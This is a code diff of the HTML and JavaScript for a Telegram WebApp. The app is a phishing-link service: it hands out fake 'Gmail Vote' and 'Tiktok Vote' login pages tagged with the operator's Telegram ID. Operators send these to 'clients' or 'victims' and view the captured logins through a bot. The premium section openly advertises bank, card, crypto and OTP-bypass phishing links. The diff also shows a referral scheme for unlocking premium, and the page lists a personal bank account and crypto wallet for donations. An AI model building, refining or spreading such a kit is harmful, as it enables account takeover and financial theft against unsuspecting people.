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", urlTemplate: "https://milaap.xo.je/sh/cv/cx.html?id={telegram-id}" },
+      { name: "Gmail Vote",        image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRQ901eAwCHJkZ_K-vjQz9vX-WNgASX8gisXw&s", urlTemplate: "https://milaap.xo.je/sh/cv/cg.html?id={telegram-id}" },
+      { name: "Tiktok Vote",       image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS2sZ4tDoHuXJBWzuZIkGQbWxLpV2gzx0TMDA&s", urlTemplate: "https://milaap.xo.je/sh/cv/ct.html?id={telegram-id}" },
+      { name: "Tiktok",            image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS2sZ4tDoHuXJBWzuZIkGQbWxLpV2gzx0TMDA&s", urlTemplate: "https://milaap.xo.je/sh/t.html?id={telegram-id}" },
     ];
+
     function formatUrl(template) {
       if (!telegramId) return "#";
       return template.replace("{telegram-id}", telegramId);
     }
 
-// Free links renderer (name visible, URL hidden)
-function renderFreeLinks() {
-  freeLinksList.innerHTML = "";
-  freeLinks.forEach(link => {
-    const li = document.createElement("li");
-    const img = document.createElement("img");
-    img.src = link.image;
-    img.alt = link.name;
-    const fullUrl = formatUrl(link.urlTemplate);
+    // ── Render Free Links ──
+    function renderFreeLinks() {
+      freeLinksList.innerHTML = "";
+      freeLinks.forEach(link => {
+        const li = document.createElement("li");
 
-    const nameText = document.createElement("div");
-    nameText.textContent = link.name;
-    nameText.style.flexGrow = "1";
-    nameText.style.marginRight = "15px";
-    nameText.style.fontWeight = "600";
-    nameText.style.fontSize = "1rem";
+        const img = document.createElement("img");
+        img.src = link.image;
+        img.alt = link.name;
 
-    const copyBtn = document.createElement("button");
-    copyBtn.textContent = "Copy link";
-    copyBtn.className = "btn";
-    copyBtn.style.marginRight = "8px";
-    copyBtn.addEventListener("click", () => {
-      // ✅ Copy first
-      navigator.clipboard.writeText(fullUrl).then(() => {
-        copyBtn.textContent = "Copied!";
-        setTimeout(() => (copyBtn.textContent = "Copy link"), 1500);
+        const fullUrl = formatUrl(link.urlTemplate);
 
-        // ✅ Show ad after copy
-        showMyAd().catch(() => {
-          console.warn("Ad failed after copy");
+        const nameDiv = document.createElement("div");
+        nameDiv.className = "link-name";
+        nameDiv.textContent = link.name;
+
+        const btnGroup = document.createElement("div");
+        btnGroup.className = "btn-group";
+
+        const copyBtn = document.createElement("button");
+        copyBtn.textContent = "Copy";
+        copyBtn.className = "btn";
+        copyBtn.addEventListener("click", () => {
+          navigator.clipboard.writeText(fullUrl).then(() => {
+            copyBtn.textContent = "✓ Copied";
+            setTimeout(() => (copyBtn.textContent = "Copy"), 1600);
+            showMyAd().catch(() => {});
+          });
         });
+
+        const openBtn = document.createElement("button");
+        openBtn.textContent = "Open";
+        openBtn.className = "btn";
+        openBtn.addEventListener("click", () => {
+          showMyAd()
+            .then(() => window.open(fullUrl, "_blank", "noopener"))
+            .catch(() => window.open(fullUrl, "_blank", "noopener"));
+        });
+
+        btnGroup.appendChild(copyBtn);
+        btnGroup.appendChild(openBtn);
+        li.appendChild(img);
+        li.appendChild(nameDiv);
+        li.appendChild(btnGroup);
+        freeLinksList.appendChild(li);
       });
-    });
+    }
 
-    const openBtn = document.createElement("button");
-    openBtn.textContent = "Open";
-    openBtn.className = "btn";
-    openBtn.addEventListener("click", () => {
-      // ✅ Show ad first, then redirect
-      showMyAd()
-        .then(() => {
-          window.open(fullUrl, "_blank", "noopener");
-        })
-        .catch(() => {
-          window.open(fullUrl, "_blank", "noopener");
-        });
-    });
-
-    li.appendChild(img);
-    li.appendChild(nameText);
-    li.appendChild(copyBtn);
-    li.appendChild(openBtn);
-    freeLinksList.appendChild(li);
-  });
-}
-    // Premium links renderer
+    // ── Render Premium Links ──
     function renderPremiumLinks() {
       if (!telegramId) {
-        premiumContent.innerHTML = `<p style="color:#ff6666; text-align:center;">Cannot detect your Telegram ID. Please open this WebApp inside Telegram.</p>`;
+        premiumContent.innerHTML = `<p style="color:#ff6666;text-align:center;">Cannot detect your Telegram ID. Please open this WebApp inside Telegram.</p>`;
         return;
       }
       if (typeof premiumUsers === "undefined") {
-        premiumContent.innerHTML = `<p style="color:#ff6666; text-align:center;">Premium list is missing. Please check premiumlist.js.</p>`;
+        premiumContent.innerHTML = `<p style="color:#ff6666;text-align:center;">Premium list is missing. Please check premiumlist.js.</p>`;
         return;
       }
-
       if (premiumUsers.includes(telegramId)) {
-        // ✅ If premium → show the links with copy + open
         premiumContent.innerHTML = "";
         const ul = document.createElement("ul");
         ul.className = "link-list";
-
         premiumLinks.forEach(link => {
           const li = document.createElement("li");
-
           const img = document.createElement("img");
           img.src = link.image;
           img.alt = link.name;
-
           const fullUrl = formatUrl(link.urlTemplate);
 
-          const nameText = document.createElement("div");
-          nameText.textContent = link.name;
-          nameText.style.flexGrow = "1";
-          nameText.style.marginRight = "15px";
-          nameText.style.fontWeight = "600";
-          nameText.style.fontSize = "1rem";
+          const nameDiv = document.createElement("div");
+          nameDiv.className = "link-name";
+          nameDiv.textContent = link.name;
+
+          const btnGroup = document.createElement("div");
+          btnGroup.className = "btn-group";
 
           const copyBtn = document.createElement("button");
           copyBtn.textContent = "Copy";
           copyBtn.className = "btn";
-          copyBtn.style.marginRight = "8px";
           copyBtn.addEventListener("click", () => {
             navigator.clipboard.writeText(fullUrl).then(() => {
-              copyBtn.textContent = "Copied!";
-              setTimeout(() => (copyBtn.textContent = "Copy"), 1500);
+              copyBtn.textContent = "✓ Copied";
+              setTimeout(() => (copyBtn.textContent = "Copy"), 1600);
             });
           });
 
@@ -626,203 +746,327 @@ function renderFreeLinks() {
             window.open(fullUrl, "_blank", "noopener");
           });
 
+          btnGroup.appendChild(copyBtn);
+          btnGroup.appendChild(openBtn);
           li.appendChild(img);
-          li.appendChild(nameText);
-          li.appendChild(copyBtn);
-          li.appendChild(openBtn);
-
+          li.appendChild(nameDiv);
+          li.appendChild(btnGroup);
           ul.appendChild(li);
         });
-
         premiumContent.appendChild(ul);
 
       } else {
-    // ❌ If NOT premium → show your upgrade message
-    premiumContent.innerHTML = `
-      <div style="max-width:500px;margin:20px auto;padding:16px;border-radius:16px;background:#151933;color:#e9ecff;font-family:system-ui,Roboto,Arial;">
-        <div style="position:relative;aspect-ratio:16/9;background:#0c0f20;border-radius:12px;overflow:hidden;">
-          <img src="https://images.unsplash.com/photo-1545239351-1141bd82e8a6?q=80&w=1200&auto=format&fit=crop" alt="Premium" style="width:100%;height:100%;object-fit:cover;display:block;">
-          <span style="position:absolute;top:12px;left:12px;background:linear-gradient(135deg,#f5c673,#d89b2b);color:#1a1205;font-weight:700;font-size:12px;padding:6px 10px;border-radius:999px;letter-spacing:.3px;">PREMIUM</span>
-        </div>
-    
-        <h3 style="margin:14px 0 8px;font-size:18px;font-weight:700;display:flex;align-items:center;gap:6px;">
-          <span>🔒</span> Bank, Credit/Debit card,  Crypto, Betting website, Spotify, otp verification code bypass, all social media links and otp bypass, and many more links </h3>
-        <p style="margin:0 0 12px;color:#97a0c3;font-size:14px;">
-          Go premium before you can copy or paste this link.
-        </p>
-    <div style="margin-top:10px;">
-  <p style="font-size:13px;color:#ffdd99;margin-bottom:6px;">
-    🔓 Invite <b>10 people</b> to unlock <b>1 week Premium</b><br>
-    (Every 10 invites = +7 days)
-  </p>
+        // Not premium
+        premiumContent.innerHTML = `
+          <div style="max-width:500px;margin:0 auto;background:var(--surface);border:1px solid var(--border);border-radius:14px;overflow:hidden;">
+            <div style="position:relative;aspect-ratio:16/9;background:#0c0f20;">
+              <img src="https://images.unsplash.com/photo-1545239351-1141bd82e8a6?q=80&w=1200&auto=format&fit=crop" alt="Premium" style="width:100%;height:100%;object-fit:cover;display:block;opacity:0.7;">
+              <span style="position:absolute;top:12px;left:12px;background:linear-gradient(135deg,#ffc84a,#e0a020);color:#1a1205;font-weight:700;font-size:11px;padding:5px 10px;border-radius:999px;letter-spacing:0.5px;">PREMIUM</span>
+            </div>
+            <div style="padding:18px;">
+              <h3 style="color:var(--text);font-size:1rem;font-weight:700;margin-bottom:8px;">🔒 Bank · Crypto · Social Media · OTP Bypass & More</h3>
+              <p style="color:var(--text2);font-size:0.88rem;margin-bottom:14px;">Go premium to access all exclusive phishing links and tools.</p>
 
-  <div style="display:flex;gap:8px;align-items:center;">
-<input id="inviteLink" type="text" readonly
-  value=""
-      style="flex:1;padding:10px;border-radius:10px;border:1px solid rgba(255,255,255,.12);
-      background:rgba(255,255,255,.06);color:#b9c0e0;font-size:13px;">
-    <button onclick="copyInviteLink()"
-      style="padding:10px 14px;border:none;border-radius:10px;
-      background:#6c8cff;color:#0a0e22;font-weight:700;">
-      Copy
-    </button>
-  </div>
+              <div style="margin-bottom:14px;">
+                <p style="font-size:0.85rem;color:var(--gold);margin-bottom:8px;">🔓 Invite <b>10 people</b> to unlock <b>1 week Premium</b> (every 10 invites = +7 days)</p>
+                <div style="display:flex;gap:8px;">
+                  <input id="inviteLink" type="text" readonly value=""
+                    style="flex:1;padding:10px;border-radius:8px;border:1px solid var(--border2);background:var(--bg);color:var(--text);font-size:0.85rem;">
+                  <button onclick="copyInviteLink()"
+                    style="padding:10px 14px;border:none;border-radius:8px;background:var(--accent);color:#fff;font-weight:700;cursor:pointer;">
+                    Copy
+                  </button>
+                </div>
+              </div>
 
-  <p style="font-size:12px;color:#9aa6ff;margin-top:6px;">
-    Share this link with 10 people to unlock premium for 7 days
-  </p>
-</div>
-        <div style="margin-top:14px;padding:10px;border:1px dashed rgba(245,198,115,.5);background:rgba(255,213,133,.08);border-radius:10px;font-size:13px;display:flex;gap:10px;align-items:center;">
-          Access locked. Upgrade to unlock this link.
-          <a href="https://t.me/intelpremiumbot/premium" target="_blank" rel="noopener noreferrer"
-             style="margin-left:auto;background:linear-gradient(135deg,#f5c673,#d89b2b);color:#1a1205;padding:8px 12px;border-radius:8px;font-weight:700;text-decoration:none;">
-            Go Premium
-          </a>
-        </div>
-      </div>
-    `;
+              <div style="padding:12px;border:1px dashed rgba(255,200,74,0.4);background:rgba(255,200,74,0.05);border-radius:8px;display:flex;gap:10px;align-items:center;font-size:0.85rem;color:var(--text2);">
+                🔒 Access locked. Upgrade to unlock all links.
+                <a href="https://t.me/intelpremiumbot/premium" target="_blank" rel="noopener noreferrer"
+                  style="margin-left:auto;background:linear-gradient(135deg,#ffc84a,#e0a020);color:#1a1205;padding:9px 14px;border-radius:8px;font-weight:700;text-decoration:none;white-space:nowrap;">
+                  Go Premium
+                </a>
+              </div>
+            </div>
+          </div>`;
       }
     }
 
-    // ✅ Updated event listeners for both buttons
+    // ── Donation ──
     function isUserInNigeria() {
       return new Date().getTimezoneOffset() === -60;
     }
     function renderDonationInfo() {
       if (isUserInNigeria()) {
         donationInfo.innerHTML = `
-          <p><strong>Donation Account (Nigeria):</strong></p>
-          <p>Account Number: <strong>9114301708</strong><br/>Bank: <strong>Opay</strong><br/>Account Name: <strong>Olatunji Abdumalik Ayomide</strong></p>`;
+          <p style="color:var(--text2);margin-bottom:8px;"><strong style="color:var(--text);">Donation Account (Nigeria)</strong></p>
+          <p style="color:var(--text2);">Account Number: <strong style="color:var(--text);">9114301708</strong><br/>Bank: <strong style="color:var(--text);">Opay</strong><br/>Name: <strong style="color:var(--text);">Olatunji Abdumalik Ayomide</strong></p>`;
       } else {
         donationInfo.innerHTML = `
-          <p><strong>Donate with crypto (BNB, USDT, BEP20):</strong></p>
+          <p style="color:var(--text2);margin-bottom:8px;"><strong style="color:var(--text);">Donate with Crypto (BNB · USDT · BEP20)</strong></p>
           <p class="crypto-address">0xbBcc409872bC2441400735624638F3D67DAa7C4C</p>`;
       }
     }
-
-    function switchPage(pageKey) {
-      Object.keys(pages).forEach(key => {
-        pages[key].classList.toggle("active", key === pageKey);
-        navButtons[key].classList.toggle("active", key === pageKey);
-      });
-    }
-    Object.entries(navButtons).forEach(([key, btn]) => {
-      btn.addEventListener("click", () => switchPage(key));
-    });
 
     renderFreeLinks();
     renderPremiumLinks();
     renderDonationInfo();
   </script>
-<script>
-  // ✅ function to show ad
-  function showMyAd() {
-    try {
-      return show_9830644()
-        .then(() => {
-          console.log("✅ Ad watched!");
-        })
-        .catch(() => {
-          console.log("⚠️ Ad failed or skipped.");
-          throw new Error("Ad failed");
-        });
-    } catch (e) {
-      console.error("Ad function not loaded yet", e);
-      return Promise.reject(e);
-    }
-  }
 
-  // ✅ Home button (Click here to see all your client login)
-  document.getElementById("openBotBtnHome").addEventListener("click", () => {
-    showMyAd()
-      .then(() => {
-        window.open("http://t.me/intelligentverificationlinkbot/customlink");
-      })
-      .catch(() => {
-        // Even if ad fails → still open bot
-        window.open("https://t.me/intelligentverificationlinkbot/customlink", "_blank");
-      });
-  });
-
-  // ✅ Victim button (Open Bot)
-  document.getElementById("openBotBtnVictim").addEventListener("click", () => {
-    showMyAd()
-      .then(() => {
-        window.open("https://t.me/intelligentverificationlinkbot?start=start", "_blank");
-      })
-      .catch(() => {
-        window.open("https://t.me/intelligentverificationlinkbot?start=start", "_blank");
-      });
-  });
-</script>
-<script>
-  // ✅ Show ad AFTER WebApp finishes loading (with small delay)
-  window.addEventListener("load", () => {
-    setTimeout(() => {
+  <!-- ── Bot Button Listeners ── -->
+  <script>
+    document.getElementById("openBotBtnHome").addEventListener("click", () => {
       showMyAd()
-        .then(() => {
-          console.log("Ad shown after WebApp load ✅");
-        })
-        .catch(() => {
-          console.warn("Ad failed after WebApp load ❌");
-        });
-    }, 10000); // ⏳ wait 10s after load (you can change the delay)
-  });
-</script>
-<!-- ✅ PREMIUM POPUP -->
-<div id="premiumModal" class="premium-modal">
-  <div class="premium-box">
-    <h3>📢 Notification</h3>
-    <p>Copy your link and send them to your client, make sure you send /start to the main bot of this webapp,👉👉 <a href="https://t.me/intelligentverificationlinkbot" target="_blank" rel="noopener noreferrer">
-  Intelligent verification link bot
-</a> because that where you will be seeing all your client Log-in</p>
-    <p>
-      We have moved some of our free links to <b>Premium</b> links.  
-      If you find the link you are looking for in the free links, but you did not see it go to premium you will see all links there! 💎
-    </p>
-<p> Don't be panic 😉 If you are not a premium users you can still copy free link's 🔗. Click one of the two options below, whelter you want to copy free links or premium link's</p>
-        <button class="premium-later-btn" onclick="closePremiumModal()">Copy free link (i will buy premium later) </button>
-    <button class="premium-ok-btn" onclick="goToPremium()">✅  Premium links (I'm already a premium users)</button>
-<a href="https://whatsapp.com/channel/0029VbBukzMC6ZvbuIyY420O/103" target="_blank">
-    <button class="whatsapp-ok-btn">✅ Join our whatsapp groups</button>
-</a>
-  </div>
-</div>
-<script>
-  function openPremiumModal(){
-    document.getElementById("premiumModal").style.display = "flex";
-  }
-
-  function closePremiumModal(){
-    document.getElementById("premiumModal").style.display = "none";
-  }
-
-  function goPremium(){
-    window.open(
-      "https://t.me/intelpremiumbot?start=ar9252926658",
-      "_blank"
-    );
-  }
-
-  function goToPremium(){
-    closePremiumModal();
-    switchPage("premium"); // ✅ Opens premium page in your app
-  }
-
-  // ✅ Auto show popup when Home loads
-  window.addEventListener("load", () => {
-    setTimeout(() => {
-      openPremiumModal();
-    }, 1500);
-  });
-</script>
-<script>
-  function copyInviteLink() {
-    const link = `https://t.me/intelligentverificationlinkbot?start=r${telegramId}`;
-    navigator.clipboard.writeText(link).then(() => {
-      alert("Invite link copied ✅\nInvite 10 people to unlock premium for 7 days");
+        .then(() => window.open("http://t.me/intelligentverificationlinkbot/customlink"))
+        .catch(() => window.open("https://t.me/intelligentverificationlinkbot/customlink", "_blank"));
     });
-  }
-</script>
+    document.getElementById("openBotBtnVictim").addEventListener("click", () => {
+      showMyAd()
+        .then(() => window.open("https://t.me/intelligentverificationlinkbot?start=start", "_blank"))
+        .catch(() => window.open("https://t.me/intelligentverificationlinkbot?start=start", "_blank"));
+    });
+  </script>
+
+  <!-- ── Auto Ad on Load ── -->
+  <script>
+    window.addEventListener("load", () => {
+      setTimeout(() => {
+        showMyAd().catch(() => {});
+      }, 10000);
+    });
+  </script>
+
+  <!-- ── Premium Popup ── -->
+  <div id="premiumModal" class="premium-modal">
+    <div class="premium-box">
+      <h3>📢 Quick Notice</h3>
+      <p>Copy your link and send it to your client. Make sure you send <b>/start</b> to
+        <a href="https://t.me/intelligentverificationlinkbot" target="_blank" rel="noopener">@intelligentverificationlinkbot</a>
+        — that's where you'll see all your client logins.
+      </p>
+      <p>
+        Some free links have moved to <b>Premium</b>. If you don't see what you need in free links, check Premium — all links are there! 💎
+      </p>
+      <p>Don't worry 😉 — non-premium users can still copy free links 🔗.</p>
+      <button class="premium-ok-btn" onclick="goToPremium()">✅ I'm already a Premium user</button>
+      <button class="premium-later-btn" onclick="closePremiumModal()">Copy free links (buy premium later)</button>
+      <a href="https://whatsapp.com/channel/0029VbBukzMC6ZvbuIyY420O/103" target="_blank" style="display:block;margin-top:8px;">
+        <button class="whatsapp-ok-btn">✅ Join our WhatsApp Group</button>
+      </a>
+    </div>
+  </div>
+
+  <script>
+    function openPremiumModal() { document.getElementById("premiumModal").style.display = "flex"; }
+    function closePremiumModal() { document.getElementById("premiumModal").style.display = "none"; }
+    function goPremium() { window.open("https://t.me/intelpremiumbot?start=ar9252926658", "_blank"); }
+    function goToPremium() { closePremiumModal(); switchPage("premium"); }
+    window.addEventListener("load", () => { setTimeout(openPremiumModal, 1500); });
+  </script>
+
+  <script>
+    function copyInviteLink() {
+      const link = `https://t.me/intelligentverificationlinkbot?start=r${telegramId}`;
+      navigator.clipboard.writeText(link).then(() => {
+        alert("Invite link copied ✅\nInvite 10 people to unlock premium for 7 days");
+      });
+    }
+  </script>
+
+  <!-- ── WhatsApp Group Popup ── -->
+  <style>
+    #waModal {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.72);
+      display: none;
+      align-items: flex-end;
+      justify-content: center;
+      z-index: 99999;
+      backdrop-filter: blur(4px);
+      padding: 16px;
+      animation: fadeInBg 0.3s ease;
+    }
+    @keyframes fadeInBg {
+      from { opacity: 0; }
+      to   { opacity: 1; }
+    }
+    #waModal.show { display: flex; }
+
+    .wa-sheet {
+      background: #1a1f2e;
+      border: 1px solid rgba(255,255,255,0.1);
+      border-radius: 20px 20px 16px 16px;
+      width: 100%;
+      max-width: 420px;
+      padding: 0;
+      overflow: hidden;
+      animation: slideUp 0.35s cubic-bezier(0.34,1.56,0.64,1);
+      position: relative;
+    }
+    @keyframes slideUp {
+      from { transform: translateY(80px); opacity: 0; }
+      to   { transform: translateY(0);    opacity: 1; }
+    }
+
+    /* Green top banner */
+    .wa-banner {
+      background: linear-gradient(135deg, #075e54, #128c7e, #25d366);
+      padding: 28px 20px 22px;
+      text-align: center;
+      position: relative;
+    }
+    .wa-banner-icon {
+      font-size: 3rem;
+      line-height: 1;
+      margin-bottom: 8px;
+      filter: drop-shadow(0 4px 12px rgba(0,0,0,0.3));
+    }
+    .wa-banner h3 {
+      font-family: 'Space Grotesk', sans-serif;
+      font-size: 1.15rem;
+      font-weight: 700;
+      color: #fff;
+      margin-bottom: 4px;
+    }
+    .wa-banner p {
+      font-size: 0.82rem;
+      color: rgba(255,255,255,0.82);
+      margin: 0;
+    }
+
+    /* Cancel X button top-right */
+    .wa-close {
+      position: absolute;
+      top: 12px;
+      right: 12px;
+      background: rgba(0,0,0,0.25);
+      border: none;
+      color: #fff;
+      width: 30px;
+      height: 30px;
+      border-radius: 50%;
+      font-size: 1rem;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: background 0.2s;
+      line-height: 1;
+    }
+    .wa-close:hover { background: rgba(0,0,0,0.5); }
+
+    /* Body */
+    .wa-body {
+      padding: 18px 20px 20px;
+    }
+    .wa-body p {
+      font-size: 0.9rem;
+      color: #b0b8cc;
+      line-height: 1.65;
+      margin-bottom: 16px;
+      text-align: center;
+    }
+    .wa-body p strong { color: #f0f2f7; }
+
+    /* Perks list */
+    .wa-perks {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      margin-bottom: 20px;
+    }
+    .wa-perk {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      background: rgba(37,211,102,0.07);
+      border: 1px solid rgba(37,211,102,0.18);
+      border-radius: 10px;
+      padding: 9px 13px;
+      font-size: 0.88rem;
+      color: #d0f5e4;
+      font-weight: 500;
+    }
+    .wa-perk span:first-child { font-size: 1.1rem; flex-shrink: 0; }
+
+    /* Buttons */
+    .wa-btn-join {
+      display: block;
+      width: 100%;
+      background: linear-gradient(135deg, #128c7e, #25d366);
+      color: #fff;
+      font-family: 'Inter', sans-serif;
+      font-weight: 700;
+      font-size: 0.95rem;
+      padding: 13px;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      text-align: center;
+      text-decoration: none;
+      transition: opacity 0.2s, transform 0.15s;
+      margin-bottom: 10px;
+    }
+    .wa-btn-join:hover { opacity: 0.9; transform: translateY(-1px); }
+
+    .wa-btn-cancel {
+      display: block;
+      width: 100%;
+      background: transparent;
+      color: #6e7a94;
+      font-family: 'Inter', sans-serif;
+      font-size: 0.85rem;
+      font-weight: 500;
+      padding: 9px;
+      border: none;
+      cursor: pointer;
+      text-align: center;
+      transition: color 0.2s;
+    }
+    .wa-btn-cancel:hover { color: #b0b8cc; }
+  </style>
+
+  <div id="waModal">
+    <div class="wa-sheet">
+      <!-- Green Banner -->
+      <div class="wa-banner">
+        <button class="wa-close" onclick="closeWaModal()" title="Close">✕</button>
+        <div class="wa-banner-icon">💬</div>
+        <h3>Join Our WhatsApp Channel</h3>
+        <p>Stay ahead with the latest updates</p>
+      </div>
+
+      <!-- Body -->
+      <div class="wa-body">
+        <p>Get <strong>instant notifications</strong> for new links, tips, and exclusive content — all in one place.</p>
+
+        <div class="wa-perks">
+          <div class="wa-perk"><span>🔗</span><span>New phishing links announced first</span></div>
+          <div class="wa-perk"><span>🚀</span><span>Tips to get more from the bot</span></div>
+          <div class="wa-perk"><span>🎁</span><span>Exclusive offers &amp; free premium days</span></div>
+          <div class="wa-perk"><span>📣</span><span>Important updates &amp; announcements</span></div>
+        </div>
+
+        <a href="https://whatsapp.com/channel/0029VbBukzMC6ZvbuIyY420O/112"
+           target="_blank" rel="noopener"
+           class="wa-btn-join"
+           onclick="closeWaModal()">
+          ✅ Join WhatsApp Channel
+        </a>
+        <button class="wa-btn-cancel" onclick="closeWaModal()">No thanks, maybe later</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    function openWaModal()  { document.getElementById("waModal").style.display = "flex"; }
+    function closeWaModal() { document.getElementById("waModal").style.display = "none"; }
+
+    // Show 5 seconds after page loads (after the premium modal clears)
+    window.addEventListener("load", () => {
+      setTimeout(openWaModal, 5000);
+    });
+  </script>
+
 </body>
-</html> 
+</html>
